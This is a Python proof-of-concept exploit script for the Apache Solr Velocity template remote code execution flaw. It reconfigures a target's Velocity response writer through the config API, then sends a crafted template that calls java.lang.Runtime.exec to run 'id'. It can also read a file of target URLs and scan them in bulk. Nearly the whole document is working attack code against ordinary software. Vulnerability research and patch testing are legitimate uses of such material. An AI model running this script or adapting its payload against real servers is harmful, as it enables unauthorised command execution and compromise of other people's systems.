# Written by 辣椒酱
# Data：2019-11-01
# Usage：python3 Apache_solr_poc.py -u url
#        python3 Apache_solr_poc.py -f url.txt
# Source ：https://github.com/Paper-Pen/TimelineSec_POC/

import re
import requests
import argparse
import json
import sys

class DemoPOC(object):
    def __init__(self, url):
        self.url =url
        self.b=False
    references = []
    name = 'Apache之Solr Velocity模板远程代码执行'
    appName = 'Apache之Solr Velocity'
    desc = '''
        Apache之Solr Velocity模板远程代码执行
    '''
    def _verify(self):
        result = {}
        url1=self.url+"/solr/test/config"
        headers1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "Content-Type": "application/json",
            "Content-Length": "259"
        }
        data = {
            "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true"
            }
        }
        data = json.dumps(data)
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
        url = self.url+"/solr/test/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"

        try:
            req = requests.post(url1, headers=headers1, data=data, timeout=5)
            req = requests.get(url, headers=headers,timeout=5)
            if "gid" in req.text:
                 u = self.url.strip('\n').strip('\r')
                 print(u + "存在Apache之Solr Velocity模板远程代码执行")
                 self.b = True
        except Exception as e:
            pass
        if self.b==False:
            print("不存在漏洞")
        return result
if __name__ == '__main__':
    if len(sys.argv) == 1:
        print('python3 Apache_solr_poc.py -u url')
        print('python3 Apache_solr_poc.py -f url.txt')
    url = None
    parser = argparse.ArgumentParser(description="aoachesolr -u 指定url -f 指定文本")
    parser.add_argument('-u', '--url', default='', help="-u http://xxx.xxx.xx")
    parser.add_argument('-f', '--pl', default='', help="-f xxx.txt")
    args = parser.parse_args()
    if args.url:
        a=DemoPOC(args.url)
        a._verify()
    if args.pl:
        with open(args.pl) as f:
            urls = f.readlines()
        for url in urls:
            u = url.strip('\n').strip('\r')
            a = DemoPOC(url)
            a._verify()
